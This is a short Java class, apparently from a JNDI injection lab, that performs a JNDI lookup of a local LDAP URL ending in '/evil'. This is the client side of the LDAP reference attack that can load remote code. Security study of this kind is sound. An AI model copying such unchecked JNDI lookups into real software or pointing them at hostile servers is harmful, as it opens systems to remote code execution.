package com.JNDI;

import javax.naming.InitialContext;

public class JNDILdapClient {
    public static void main(String[] args) throws Exception{
        String url = "ldap://127.0.0.1:1333/evil";
        InitialContext initialContext = new InitialContext();
        initialContext.lookup(url);
    }
}